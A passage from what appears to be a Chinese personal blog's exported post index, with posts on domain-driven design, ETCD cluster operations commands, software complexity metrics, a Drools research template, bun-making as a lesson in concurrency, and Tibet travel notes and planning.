领域驱动设计在讲什么领域驱动设计中的领域是什么？我理解的是一个比行业更加细分的方向，比如互联网做电商业务是电商领域，电商中有专注交易的交易领域，做电子支付叫支付领域。领域范围可大可小，领域知识表示某些具有相关相关性知识的合集。 领域驱动设计是通过领域知识构建的领域模型来控制业务的复杂性，通过领域模型反映领域知识，构建更易维护的系统。解决软件难以理解，难以演化的问题。 上面的总结涉嫌鸡生蛋蛋生鸡的问题。其实领域模型和领域知识是迭代产生的，随着人类抽象总结而不断凝练而成的。拿之前讨论过的例子来说，一个电商领域专家可能脱口而出订单的概念，大家先入为主的很容易理解这个概念。 从人类历程来看最早出现的是物物交换的概念，后面逐渐变成等价货币交换，我们抽象的名词叫交易，再到后面你从我这里付一笔钱，我给你一个凭据，过段时间你来取货，我们管这叫购买凭据，进而逐渐演化成订单这个概念。 领域驱动设计的核心价值领域驱动设计的核心目标是基于特定业务范围，通过统一业务概念（统一语言），将系统参与各方整合在一起，从而减少不同角色和环节的信息熵减问题。 领域模型是领域驱动设计的核心产出，它不仅能描述真实的业务逻辑和业务场景，也是系统实现的表达方式。领域模型的适应性能直接反应系统的扩展性上，能否使系统在增大时仍然保持敏捷。 领域驱动设计之所以更加流行，很大因素是领域驱动设计提供的方法论上与近些年流行的微服务有很好的匹配性，通过领域驱动设计方法清晰地识别业务边界，以此来指导微服务的拆分。 领域驱动设计提供的领域划分方法可以指导我们对微服务的拆分，以及对于演进式架构有很强的助力。 领域驱动设计的适用场景通过上面对于领域驱动设计的介绍，可以提炼出三个主要作用： 统一通用语言，降低不同角色间的沟通成本。 通过战略设计划分子域、限界上下文，以此垂直拆解复杂度。 通过聚合的方式进行建模，以此水平拆解复杂度。 通过以上三个作用来逐步介绍领域驱动设计的适用场景。 多角色协作的业务场景领域驱动设计中引入领域专家角色，是指对某个领域的概念和流程有着深入理解的一类人。开发人员与领域专家之间，他们掌握的知识存在巨大的差异。就比如电商领域专家清楚地了解交易单、订单、子单、售后、物流单、运单这些概念的准确含义，而开发人员更专注技术的运用，在沟通中如果没有达成一致的理解，沟通效率就会很差，甚至产生误解。 领域驱动设计提出从需求中提炼出统一语言，其实就是在两个不同的语言世界中进行正确翻译的过程。在多角色协作的场景中可以有效降低沟通成本，迭代式的探索和发现模型。 复杂业务场景进行业务拆解上面我们提到现代电商促销方案层出不穷，决定一笔交易的金额有很多影响因素，而算价结果直接影响到这笔交易的支付金额，以及每件商品的实付金额。如果我们认为促销价格计算和交易联系很紧密就把他们放到了一起去开发维护，我想这个系统后面必定会难以维护，最终进行拆分。 而系统拆分的指导思想就是我们耳熟能详的六个字：『高内聚，低耦合。』 领域驱动设计有着一套完整的方法论，指导我们对复杂问题进行拆分、梳理各个子系统间的关系，帮助我们落地复杂系统。","categories":[{"name":"领域驱动设计","slug":"领域驱动设计","permalink":"https://noogel.xyz/categories/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"架构","slug":"架构","permalink":"https://noogel.xyz/tags/%E6%9E%B6%E6%9E%84/"},{"name":"领域驱动设计","slug":"领域驱动设计","permalink":"https://noogel.xyz/tags/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"}]},{"title":"云之彼端，生活的另一种打开方式","slug":"关于生活/寻人不遇/云之彼端，生活的另一种打开方式","date":"2021-11-25T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2021/11/25/1.html","link":"","permalink":"https://noogel.xyz/2021/11/25/1.html","excerpt":"","text":"在加乌拉山口拍珠峰，这里可以一眼望尽五座八千米高山。 旅行是为了什么？有的人是为了好吃好玩，有的人是为了看风景。我就是后者，如果你喜欢游览祖国广袤的山川河流，看尽一望无际的高原雪山，那么你一定要来趟西藏，看看还是那么相对纯粹的自然风光。 去西藏的计划是从八月推迟到了十一黄金周，不过今年西藏的十一却少了往日的火爆，人不是那么多，主要还是因为前一段事件疫情的影响，所以路上的体验都还不错。 全国除了西藏都是可以想去就去的，而西藏是需要好好准备一下的，为此也踩了一些坑。就拿抗高反来说吧，去之前你需要做的是好好休息，减少运动量就可以了，不用喝什么红景天、高原康之类的，作用不大。在高原防止高反只需要做到以下几点即可： 晚上保证充足的睡眠。 多吃高热量实物来保障能量供应。 放平心态，不要有心理压力。 到高原先缓两天再安排行程。 刚去的前几天高反加水土不服，在羊卓雍措的湖边住房车，大半夜的跑到车外吐了好几次，第二天买了藿香正气就好了，然后就是听司机的话，觉得不舒服就喝点葡萄糖，确实很有效。 到了西藏，面对壮阔的雪山群，纯净的圣湖，当然要留下一些回忆。 在海拔 5200 米的珠峰大本营，珠峰山顶总被云雾缠绕着，能近距离的看到很难得。 羊卓雍措是西藏的三大圣湖之一，从山上看下去，湖水呈靛青色，就跟染料一般纯净，和其它湖水的蓝很不一样。 纳木错也是西藏的三大圣湖之一，蓝色湖水对面的雪山就是念青唐古拉山脉。 在西藏还有一点独特的体验就是看星空，与平原不同地是这里的高海拔，使得星空银河非常清晰明显，你会看到银河从地上的一端穿过天空扎向另一端。站在山顶的那一刻我终于体会到儿时的一句话『天空是一块幕布，星星和月亮就是装饰这块幕布的花纹。』望着繁星与银河，感觉到自己渺小，如这沧海中的一粟。 西藏之旅还有很多有意思的故事与见闻，虽然这篇文章鸽了这么久，但是我还是不想再去讲了。总之这是一场头疼并快乐的旅途~","categories":[],"tags":[{"name":"游记","slug":"游记","permalink":"https://noogel.xyz/tags/%E6%B8%B8%E8%AE%B0/"}]},{"title":"ETCD 运维笔记","slug":"关于技术/中间件/ETCD运维笔记","date":"2021-11-16T00:00:00.000Z","updated":"2025-07-23T07:30:58.914Z","comments":true,"path":"2021/11/16/1.html","link":"","permalink":"https://noogel.xyz/2021/11/16/1.html","excerpt":"","text":"调研环境说明 etcd –versionetcd Version: 3.5.1Git SHA: d42e8589eGo Version: go1.17.2Go OS&#x2F;Arch: darwin&#x2F;amd64 参数说明启动参数 1234567891011121314--name etcd-1 // 节点名称--data-dir /Users/noogel/Debug/data/etcd1 // 数据目录--initial-advertise-peer-urls http://127.0.0.1:238--listen-peer-urls http://127.0.0.1:2381--listen-client-urls http://127.0.0.1:2379--advertise-client-urls http://127.0.0.1:2379--initial-cluster-token etcd-lock-cluster-1 // 集群 token--initial-cluster etcd-1=http://127.0.0.1:2381,etcd-2=http://127.0.0.1:2382,etcd-3=http://127.0.0.1:2383 // 集群节点信息--initial-cluster-state new // 初始化的集群状态--heartbeat-interval 1000 // 心跳间隔--auto-compaction-retention 1 // 开启自动压缩，间隔 1h 执行--auto-compaction-mode periodic--quota-backend-bytes 8589934592 // 后端存储大小--election-timeout 5000 // 选举超时时间 关于自动压缩https://etcd.io/docs/v3.4/op-guide/maintenance/#defragmentation --auto-compaction-mode=revision --auto-compaction-retention=1000 每5分钟自动压缩”latest revision” - 1000 --auto-compaction-mode=periodic --auto-compaction-retention=12h 每1小时自动压缩并保留12小时窗口。 自动压缩碎片后还需要单独再清理占用的系统存储空间，etcdctl defrag。 最佳实践 heartbeat timeout 默认为 100ms,推荐配置为 1s; election timeout 默认为 1000ms,推荐为 5s(election timeout &gt;&#x3D; 5 * heartbeat timeout); quota-backend-bytes 默认为 2G(最大值8G),推荐根据集群容量预估调整; 配置 auto-compaction-retention&#x3D;1 和 auto-compaction-mode&#x3D;periodic 参数，定期压缩历史数据; 推荐通过 cronjob 定期执行 etcdctl defrag（如果 defrag 执行时间 &gt; election timeout，则集群会进入重新选主模式） 环境模拟端口映射单机环境写集群搭建，以下是端口映射 etcd1 2379 -&gt; 2391 2380 -&gt; 2381 etcd2 2379 -&gt; 2392 2380 -&gt; 2382 etcd3 2379 -&gt; 2393 2380 -&gt; 2383 启动命令12345ETCDCTL_API=3 etcd --name etcd-1 --data-dir /Users/noogel/Debug/data/etcd1 --initial-advertise-peer-urls http://127.0.0.1:2381 --listen-peer-urls http://127.0.0.1:2381 --listen-client-urls http://127.0.0.1:2379 --advertise-client-urls http://127.0.0.1:2379 --initial-cluster-token etcd-lock-cluster-1 --initial-cluster etcd-1=http://127.0.0.1:2381,etcd-2=http://127.0.0.1:2382,etcd-3=http://127.0.0.1:2383 --initial-cluster-state new --heartbeat-interval 1000 --auto-compaction-mode=revision --auto-compaction-retention=1000 --quota-backend-bytes 8589934592 --election-timeout 5000 &gt; /Users/noogel/Debug/data/etcd1/run.log 2&gt;&amp;1 &amp;ETCDCTL_API=3 etcd --name etcd-2 --data-dir /Users/noogel/Debug/data/etcd2 --initial-advertise-peer-urls http://127.0.0.1:2382 --listen-peer-urls http://127.0.0.1:2382 --listen-client-urls http://127.0.0.1:2378 --advertise-client-urls http://127.0.0.1:2378 --initial-cluster-token etcd-lock-cluster-1 --initial-cluster etcd-1=http://127.0.0.1:2381,etcd-2=http://127.0.0.1:2382,etcd-3=http://127.0.0.1:2383 --initial-cluster-state new --heartbeat-interval 1000 --auto-compaction-mode=revision --auto-compaction-retention=1000 --quota-backend-bytes 8589934592 --election-timeout 5000 &gt; /Users/noogel/Debug/data/etcd2/run.log 2&gt;&amp;1 &amp;ETCDCTL_API=3 etcd --name etcd-3 --data-dir /Users/noogel/Debug/data/etcd3 --initial-advertise-peer-urls http://127.0.0.1:2383 --listen-peer-urls http://127.0.0.1:2383 --listen-client-urls http://127.0.0.1:2377 --advertise-client-urls http://127.0.0.1:2377 --initial-cluster-token etcd-lock-cluster-1 --initial-cluster etcd-1=http://127.0.0.1:2381,etcd-2=http://127.0.0.1:2382,etcd-3=http://127.0.0.1:2383 --initial-cluster-state new --heartbeat-interval 1000 --auto-compaction-mode=revision --auto-compaction-retention=1000 --quota-backend-bytes 8589934592 --election-timeout 5000 &gt; /Users/noogel/Debug/data/etcd3/run.log 2&gt;&amp;1 &amp; 历史数据清理命令1234rm -rf /Users/noogel/Debug/data/etcd1rm -rf /Users/noogel/Debug/data/etcd2rm -rf /Users/noogel/Debug/data/etcd3mkdir etcd1 etcd2 etcd3 日常运维常规命令1234567export ETCDCTL_API=3// 节点列表查询etcdctl member list// 节点状态etcdctl --endpoints=127.0.0.1:2381,127.0.0.1:2382,127.0.0.1:2383 endpoint status --write-out=table// 整理磁盘碎片etcdctl --endpoints=127.0.0.1:2381,127.0.0.1:2382,127.0.0.1:2383 --user root:123456 defrag 开启鉴权12345678// 添加 root 用户etcdctl --endpoints=127.0.0.1:2381,127.0.0.1:2382,127.0.0.1:2383 user add root// 授权 root 角色etcdctl --endpoints=127.0.0.1:2381,127.0.0.1:2382,127.0.0.1:2383 user grant-role root root// 查看用户列表etcdctl --endpoints=127.0.0.1:2381,127.0.0.1:2382,127.0.0.1:2383 --user=root:123456 user list// 开启鉴权etcdctl --endpoints=127.0.0.1:2381,127.0.0.1:2382,127.0.0.1:2383 auth enable 生产集群节点启动方式在生产机通过 systemd 启动。第一次启动命令--initial-cluster-state new，后续节点的增加需要修改为 --initial-cluster-state existing，不明白看节点增加部分。 修改配置 12345678// 编辑配置vim /lib/systemd/system/etcd.service// 重新加载配置systemctl daemon-reload// 启动服务systemctl start etcd.service// 查看服务状态systemctl status etcd.service 问题处理Etcd 的 compact 机制Etcd 默认不会自动 compact，需要设置启动参数，或者通过命令进行compact，如果变更频繁建议设置，否则会导致空间和内存的浪费以及错误。Etcd v3 的默认的 backend quota 2GB，如果不 compact，boltdb 文件大小超过这个限制后，就会报错：”Error: etcdserver: mvcc: database space exceeded”，导致数据无法写入。 要从空间不足配额警报中恢复： Compact etcd的历史。 对每个etcd端点进行碎片整理。 解除警报。 1234567891011# 1、获取当前的版本$ rev=$(ETCDCTL_API=3 etcdctl --endpoints=:2379 endpoint status --write-out=&quot;json&quot; | egrep -o &#x27;&quot;revision&quot;:[0-9]*&#x27; | egrep -o &#x27;[0-9].*&#x27;)# 2、压缩当前版本之前的所有记录$ ETCDCTL_API=3 etcdctl compact $revcompacted revision 1516# 3、清理多余的碎片空间$ ETCDCTL_API=3 etcdctl defragFinished defragmenting etcd member[127.0.0.1:2381]# 4、解除警告$ ETCDCTL_API=3 etcdctl alarm disarmmemberID:13803658152347727308 alarm:NOSPACE 需要注意的是整理碎片释放空间，要一个一个节点执行，因为在执行期间节点是无响应的，直到处理完。防止因为全部节点无响应导致的服务不可用 碎片整理压缩key空间后，会出现内部碎片，这些压缩出来的碎片空间可以被etcd使用，但是不会真正的释放物理空间，需要进行碎片整理，如： 12$ etcdctl defragFinished defragmenting etcd member[127.0.0.1:2379]以上指令只作用于当前所在的主机，不会在集群 环境中复刻。可以使用–cluster标记指定所有成员以自动查找所有集群成员。如： 1234$ etcdctl defrag --clusterFinished defragmenting etcd member[http://127.0.0.1:2381]Finished defragmenting etcd member[http://127.0.0.1:2382]Finished defragmenting etcd member[http://127.0.0.1:2383] 节点增减12345678# 查看成员信息ETCDCTL_API=3 etcdctl member list# 移除节点ETCDCTL_API=3 etcdctl member remove wallet0x# 添加节点ETCDCTL_API=3 etcdctl member add wallet0x --peer-urls=&quot;http://10.137.158.119:2380&quot;# 最后再启动服务# 其中启动命令 --initial-cluster-state 需要设置为 existing。 需要先移除故障节点成员，再添加进去成员列表。然后清理掉故障节点的工作目录内容，之后再启动服务，启动后服务会自动同步数据。 其中启动命令需要设置为 --initial-cluster-state existing。 参考链接http://www.zhaowenyu.com/etcd-doc/ops/data-space-manage.htmlhttps://xieys.club/etcd-backup-restorehttps://www.cnblogs.com/lowezheng/p/10307592.htmlhttps://bbotte.github.io/service_config/etcd-cluster-troubleshooting.htmlhttps://www.mytecdb.com/blogDetail.php?id=211https://www.cnblogs.com/tencent-cloud-native/p/14893209.htmlhttp://www.dockone.io/article/2955https://mytecdb.com/blogDetail.php?id=199","categories":[],"tags":[{"name":"中间件","slug":"中间件","permalink":"https://noogel.xyz/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"}]},{"title":"周末在厨房的一些思考","slug":"关于生活/周末在厨房的一些思考","date":"2021-10-31T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2021/10/31/1.html","link":"","permalink":"https://noogel.xyz/2021/10/31/1.html","excerpt":"","text":"概况作为一个北方汉子对于面食真的是十分热爱的，尤其是发面后的。从小在家兜包子都是只能看不让参与的，长大后在外面都是买现成的，如今也想自己做一做。也许是从小在家耳濡目染，第一次做整体的效果还不错。宋丹丹老师曾经说过把大象装进冰箱总共要分三步，那么蒸包子总共需要分为如下五步： 准备原材料 发面 调馅 擀面片 蒸包子 可是，真的就是只蒸了包子吗？ 关于蒸包子的一些思考分治法就像我之前聊到过的，复杂的东西是由许多简单的东西组成的。就像蒸包子这件事不一定多么复杂，但也不那么简单，要想做好也是要拆分成上面五个相对简单的步骤执行。作为一个后端工程师，现在做事情总是会带入一些思维模型去看，这个例子是分治法来将蒸包子这件事简单化，只要我们把其中简单的每一步做好就可以最终把包子蒸好。 批处理当我把包子蒸好以后，发现耗时很长，那么怎么提高效率呢。刨除在网上买菜等菜的时间，大致的时间线如下： 发面准备：15:00 -&gt; 15:30发面期间：15:30 -&gt; 17:00做、调馅：16:30 -&gt; 17:30擀皮 ：17:30 -&gt; 18:00包、蒸 ：18:00 -&gt; 19:00 总计人力耗时 3 小时，出锅 18 个包子。如果我要是蒸 36 个包子就要消耗 6 小时的时间吗？答案是要小于 6 小时的，主要原因有以下几点： 蒸笼仍有一半的空间未用，可以节省掉一次烧水蒸包子的时间。 每个环节都可以节省准备工具，收拾工具的时间。 但是我要再多蒸一倍的包子是不是平均耗时会更短，这个就不一定了，如果蒸锅的承载上限就是 36 个包子，那平均耗时就不会再减少。批处理的方案在一定程度上会提高我们的效率，但不会无限提高，而是有一个最优解，这个最优解取决于外在条件。 并发思维以上情况分析的是单人力情况下，如果再有一个人一起做。可以有以下方面提升： 我们发现面团在 17:00 发好的，擀皮在 17:30 才开始的，中间阻塞的时间在弄馅。把弄馅的时间交给第二个人做，可以减少 30 分钟阻塞。 发面准备分两个人做可以大致减少 15 分钟耗时。 两个人一起包包子可以大致减少15分钟耗时。 额外损耗，例如工具准备上因为多加了一套工具会产生额外耗时。 最后大致的总人力耗时会大于 3 小时，平均人力耗时在 1.5 到 2小时之间。并发思维又是我们另外一个手段。 流水线模型上面需要人操作的蒸包子需要四步，其中每一步都会有一些内耗是在每步切换时都需要思考下一步该怎么做，以及准备对应步骤的工具撤掉上一步骤的工具。如果我们厨房能供四人同时使用，并且每人只做一步的事，那么每一步的耗时就会因为熟能生巧而使时间大大缩短。如果这是一家包子店的厨房，那么这四个人就可以源源不断的高效生产包子。通过流水线模型来提高效率，这也是并发的一种。 工具化思维再假如，北京所有的人早餐都要来这家店吃包子，那么任凭这四个人怎么日夜生产，也不能满足整个北京的需求。如果还是这四个人怎么做？如果恰好其中有一个人学过机械相关的知识并且动手能力又很强，这时候他可以和其他三个人一起交流蒸包子的心得，然后结合整个知识，设计出蒸包子机器，然后找工厂生产出几十台日夜生产，我想北京的包子供应应该就没问题了。他们四个人只需要盯盯机器，坏了修一修就好了。这里面就用到了工具化思维，可以极大的提高我们的生产效率。工业革命的意义之一就是创造了巨大的生产力。 说了这么多，下面附上我的蒸包子攻略~ 蒸包子攻略准备原材料 准备面皮 面粉 1 kg 酵母粉 5g 温水 准备馅（猪肉大葱） 猪肉馅 500g 大葱 500g 姜、料酒、胡椒粉 耗油、鸡精、生抽 香油 老抽 发面 用温水冲开酵母粉，混合均匀后加入面粉中和面。 慢慢慢慢~加水，搅拌成絮状。 最后柔成光滑的圆面团。 放到温暖的地方发酵，一小时左右吧，面团最后会放大一倍左右。 加水的时候需要慢慢加慢慢抓，慢慢会形成一个光滑的圆团，面团的软硬跟水的多少有关，如果面硬的话可以适当加一些水调整软硬程度。 调馅 趁着面团发酵期间，可以开始准备调馅了。买的是绞好的猪肉馅，然后就是把两颗大葱切碎，切点姜碎进去。 加入上述的各种调料调整肉馅的口味。由于放了老抽和生抽，盐可以少放或者不放，根据个人口味来看。 加好以后搅拌均匀就行了。 其中老抽用来调色，生抽、鸡精、耗油用来调味，胡椒粉、姜碎、料酒用来去腥，加一些香油可以让肉馅变得超级香。 擀面片 调好馅可以休息一会，待发好面取出来继续揉捏，直到里面没有气泡了。 然后揉成一个细条状，用刀切成一段一段的。用手掌按成扁圆的。 用擀面杖一点点擀成扁片，厚度比饺子皮厚一些，标准的面片是边缘较薄中心较厚的圆形。 蒸包子 准备一个篦子，上面放好屉布，待包子包好放上去。至于兜包子的手法直接网上查吧。 准备好蒸锅，放上包子开火后蒸20分钟左右即可，关火后放 5分钟。 最后的出锅，因为包子会变大导致互相黏连，可以准备一些清水滴到屉布和包子连接处湿润，这样包子就可以完好的取下了。 最后来一张出锅照，年轻人的第一锅包子就这样做好了。 最后工作和生活中我们会遇到很多事和物，事事物物之间有很多共通之处，包括问题的产生和解决办法。不同表象的背后相同的本质的东西是思维方式还是抽象模型？看清它们，能带给我的是做出好吃的包子，不仅仅是这些，还有更多。","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"}]},{"title":"软件架构与系统复杂性","slug":"关于技术/架构总结/软件架构与系统复杂性","date":"2021-10-22T00:00:00.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2021/10/22/1.html","link":"","permalink":"https://noogel.xyz/2021/10/22/1.html","excerpt":"","text":"什么是复杂性复杂或复杂性与简单相对立，那么复杂是什么？它是我们大脑中的一个概念，但是我在网上找不到一个给复杂恰当的定义描述，它会有不同的解释。其中洛克在《人类理解论》中说道：『一些思想是由简单的思想组合而成，我称此为复杂；比如美、感激、人、军队、宇宙等。』作为研究复杂系统的专家 Melanie Mitchell，也没有给出一个明确的公认的定义。她在《复杂》一书中给出了复杂系统加以定义：『复杂系统是由大量组分组成的网络，不存在中央控制，通过简单运作规则产生出复杂的集体行为和复杂的信息处理，并通过学习和进化产生适应性。』上述复杂系统中的组分对应软件系统中的组成部分，基于不同粒度可以是对象、函数、类、包、模块、组件和服务等。每一部分都应该是相对单一的职责，细粒度部分之间耦合提供更粗粒度功能，不同组分之间相互协作来提供系统功能，继而组合成我们复杂的软件系统。 软件系统复杂性由何而来计算机的产生对我们生产生活产生的影响不言而喻，其中软件系统的功能是随着我们实际生活需求的变化而变化的。人有七情六欲带来的各种需求，接收信息的方式主要是视觉、听觉。而机器擅长的只是简单的逻辑处理和数值计算，两者之间有着巨大的鸿沟。如何让机器提供视觉和听觉的手段来满足人们的需求，这里抛开硬件不谈，软件层面有操作系统提供基本的软件运行环境。软件系统则只需要专注于如何组织和管理数据来满足人们的工作生活娱乐需求，一方面要关注人的需求和需求变化，另一方面要关注机器层面能提供的计算能力。软件系统的复杂性来自于两个方面，一方面是需求侧复杂，导致大多数系统的功能都难以理解；另一方面是难以把控需求的变化，虽然我们遵循一些设计原则可以对未来进行一些预判，但还是存在不可预测的风险。 如何度量复杂度在《复杂》一书中作者列举了不同角度可能度量复杂性的方法。 生物学上尝试通过基因组的规模来度量。 信息学上尝试通过熵、信息量、交互信息来度量。 用算法信息量度量复杂性（能够产生对事物完整描述的最短计算机程序的长度。） 此外还有逻辑深度、热力学深度、分形维度等方面。 复杂度并没有一个统一明确的度量方式，我们可以站在一个角度上对具体的某类或粒度提供一个可供参考的度量方法。不论我们如何度量，我们在开发软件系统中的一个重要目标就是控制和降低系统复杂度。在巨著《人月神话》中提出了两个重要概念： 本质复杂度：指由于一问题的本质不适合简单的求解方式，所有可行的求解方式都很复杂的情形。 偶然复杂度：指电脑软件开发过程中所引入不必要的复杂度。 偶然复杂度不是待求解问题的本质，相对而言， 本质复杂度和待求解问题的本质有关，是无法避免的。偶然复杂度一般是因为选用求解问题的方法时所引入的。 在源代码层面为了描述工程质量有以下两个方面衡量： 圈复杂度：根据代码中的路径数量计算的循环复杂性。每当一个函数的控制流发生分裂时，复杂度计数器就会增加1。每个函数的最小复杂度为1。由于关键字和功能的不同，这种计算方法在语言上略有不同。以 Java 为例增加复杂度的关键字有：if, for, while, case, catch, throw, &amp;&amp;。 认知复杂度：是由sonarQube设计的一个算法，算法将一段程序代码被理解的复杂程度，估算成一个整数——可以等同于代码的理解成本。作为指导程序员编写“既可测试又可维护”的方法。 在认知复杂度的计算方法中主要基于以下三条规则： 忽略那些允许将多个语句可读性地速记为一个的结构。 在代码的线性流程中，每中断一次就累加 1。 当断流结构被嵌套时难度累加 1。 下面实例对比两种复杂度度量方法的差异，在不同写法上圈复杂度的统计和认知复杂度的统计有何差异。 上图是两种写法在圈复杂度的统计方法，得出的值都是 4，也就是从逻辑上来说是相同的。但是在可读性上来说，明显右侧的 switch 代码更高。认知复杂度就是为了度量人的易于理解性上存在的。 以上是认知复杂度算法给这两种方法打出了明显不同的分数，这些分数更能反映出它们的相对可理解性。更具体的内容可以查看 CognitiveComplexity 。 如何管理系统复杂度架构的本质目标就是管理复杂度，而管理复杂度有以下三种有效的手段： 抽象：从众多的具体事物当中抽取共同的、本质的属性，摒弃差异的非本质属性，简化描述形成概念。 分治：把一个复杂的问题分成两个或更多的相同或相似的子问题，再把子问题分成更小的子问题……直到最后子问题可以简单的直接求解，原问题的解即子问题的解的合并。 领域知识：是指一组有内在联系的知识的集合，它往往与特定的职业、研究方向、兴趣、社群或文化圈层等相关联。","categories":[],"tags":[{"name":"架构","slug":"架构","permalink":"https://noogel.xyz/tags/%E6%9E%B6%E6%9E%84/"}]},{"title":"技术组件调研模板V1（以 Drools 为例）","slug":"关于技术/效率/技术组件调研模板V1","date":"2021-10-20T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2021/10/20/1.html","link":"","permalink":"https://noogel.xyz/2021/10/20/1.html","excerpt":"","text":"初步认知 以 Drools 为例子 这个组件是什么，有什么功能？ Drools 是一个基于Charles Forgy’s的RETE算法的，易于访问企业策略、易于调整以及易于管理的开源业务规则引擎，符合业内标准，速度快、效率高。业务分析师人员或审核人员可以利用它轻松查看业务规则，从而检验是否已编码的规则执行了所需的业务规则。Drools相关概念 事实（Fact）：对象之间及对象属性之间的关系 规则（rule）：是由条件和结论构成的推理语句，一般表示为if…Then。一个规则的if部分称为LHS，then部分称为RHS。 模式（module）：就是指IF语句的条件。这里IF条件可能是有几个更小的条件组成的大条件。模式就是指的不能在继续分割下去的最小的原子条件。 Drools通过 事实、规则和模式相互组合来完成工作，drools在开源规则引擎中使用率最广，但是在国内企业使用偏少，保险、支付行业使用稍多。 能解决什么问题？ 「规则引擎主要完成的就是将业务规则从代码中分离出来。」 在规则引擎中，利用规则语言将规则定义为if-then的形式，if中定义了规则的条件，then中定义了规则的结果。规则引擎会基于数据对这些规则进行计算，找出匹配的规则。这样，当规则需要修改时，无需进行代码级的修改，只需要修改对应的规则，可以有效减少代码的开发量和维护量。 这个组件对比竞品有什么优势和劣势？ 易用性、广泛性、高性能、高可用、高一致性等方面。Java开源的规则引擎有：Drools、Easy Rules、Mandarax、IBM ILOG。使用最为广泛并且开源的是Drools。规则引擎优点 声明式编程 逻辑和数据分离 速度和可扩展性 知识集中化 规则引擎缺点 复杂性提高 需要学习新的规则语法 引入新组件的风险 原理了解这个组件实现机制是什么样的？ Drools规则引擎的结构示意图：在 Drools 中，规则被存 放在 Production Memory（规则库）中，推理机要匹配的 facts（事实）被存在 Working Memory（工作内存）中。当时事实被插入到工作内存中后，规则引擎会把事实和规则库里的模式进行匹配，对于匹配成功的规则再由 Agenda 负责具体执行推理算法中被激发规则的结论部分，同时 Agenda 通过冲突决策策略管理这些冲突规则的执行顺序。Drools 中规则冲突决策策略有 优先级策略 复杂度优先策略 简单性优先策略 广度策略 深度策略 装载序号策略 随机策略 使用了什么算法\\模型\\框架？ Rete 算法最初是由卡内基梅隆大学的 Charles L.Forgy 博士在 1974 年发表的论文中所阐述的算法 , 该算法提供了专家系统的一个高效实现。自 Rete 算法提出以后 , 它就被用到一些大型的规则系统中 , 像 ILog、Jess、JBoss Rules 等都是基于 RETE 算法的规则引擎。 Rete 在拉丁语中译为”net”，即网络。Rete 匹配算法是一种进行大量模式集合和大量对象集合间比较的高效方法，通过网络筛选的方法找出所有匹配各个模式的对象和规则。 其核心思想是将分离的匹配项根据内容动态构造匹配树，以达到显著降低计算量的效果。Rete 算法可以被分为两个部分：规则编译和规则执行。当Rete算法进行事实的断言时，包含三个阶段：匹配、选择和执行，称做 match-select-act cycle。Drools 中的 Rete 算法被称为 ReteOO，表示 Drools 为面向对象系统（Object Oriented systems）增强并优化了 Rete 算法。 上手使用使用场景有哪些？ 从Drools规则引擎的使用模版来看，输入、输出和判断三个中，判断是变化的，而输入和输出是基本固定的，所以适用的场合可以分为下面几种： 输入和输出的参数不变，即：规则文件接收固定的参数，产生固定的输出。比如：根据货物重量计算运输价格，输入参数是货物重量，规则根据级差价格表，输出运输价格。 输入和输出的JavaBean Object不变，即：规则文件接收固定类型的JavaBean，产生固定类型的JavaBean。比如：根据顾客信息和当前购物信息计算优惠价格，输入参数是顾客当前的类别（VIP客户等）和当前购物的种类、数量，规则根据顾客类别、商品种类和购买数量输出优惠价格。 所以，规则引擎适用于「问题确定」的场景，并且存在比较复杂的业务规则并且业务规则会「频繁变动」的系统。比如： 风险控制系统（风险贷款、风险评估） 反欺诈项目（银行贷款、征信验证） 决策平台系统（财务计算） 促销平台系统（满减、打折、加价购） 在项目中使用上需要怎么做？ TODO 在使用过程中容易踩到哪些坑？ TODO 参考资料 网络文章、杂志专栏、论文等https://blog.csdn.net/Taobaojishu/article/details/108231696","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"}]},{"title":"旅游攻略模板（以西藏为例）","slug":"关于生活/寻人不遇/旅游攻略模板","date":"2021-09-08T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2021/09/08/1.html","link":"","permalink":"https://noogel.xyz/2021/09/08/1.html","excerpt":"模板的好处就在于可以让你快速且全面的规划方案，一些你能想到和不能想到的地方。既能避免你在做旅游规划时漏掉什么，又能节省你思考的时间。有了模板你只需要按照大纲去调研即可。 如果你旅游前需要详细规划，那么这个模板很适合你。如果你是想走开车就走的那种，可以跳过这篇。 模板按需填充即可，比如去西藏就需要特别关注海拔信息。去三亚就需要关注一下日出日落和潮汐时间。下面是我在做西藏旅游攻略做的一个简单攻略，仅供参考。","text":"模板的好处就在于可以让你快速且全面的规划方案，一些你能想到和不能想到的地方。既能避免你在做旅游规划时漏掉什么，又能节省你思考的时间。有了模板你只需要按照大纲去调研即可。 如果你旅游前需要详细规划，那么这个模板很适合你。如果你是想走开车就走的那种，可以跳过这篇。 模板按需填充即可，比如去西藏就需要特别关注海拔信息。去三亚就需要关注一下日出日落和潮汐时间。下面是我在做西藏旅游攻略做的一个简单攻略，仅供参考。 物品清单（速查） 类别 明细（气温：白天 15 - 20 ；夜间 5 - 10） 其它装备 墨镜（镜夹）、遮阳帽、魔术头巾 上衣类 保暖衣两件冲锋衣（防风）轻便羽绒服 下衣类 保暖裤两件冲锋裤（防风） 鞋袜 徒步鞋一双薄袜 5 双 洗漱类 旅行牙刷牙膏、便携洗发露、毛巾，（不要洗澡） 工具类 充电装备：充电宝 2 个、充电器、充电线 2 根拍摄装备：相机一个、电池两块、三脚架、B门垃圾袋 10 个、湿巾 50 片、保温杯、口罩10个 关键物品 证件信息：身份证、社保卡、驾驶证现金：500 分两处 关键药品 药品信息：藿香正气液（治水土不服）、感冒药、头晕药、葡萄糖高原红景天（进藏前7天开始服用到出藏）（没用）『我去过27次藏区，带过300多人，我的经验是在头疼腿疼时候，遵医嘱服用8分钱一包的阿咖酚散就很灵验』 前期规划目标 了解西藏的人文地理 拍风景照，山川湖泊 行程安排 日期（星期） 行程 行程安排 其他备注 9-30 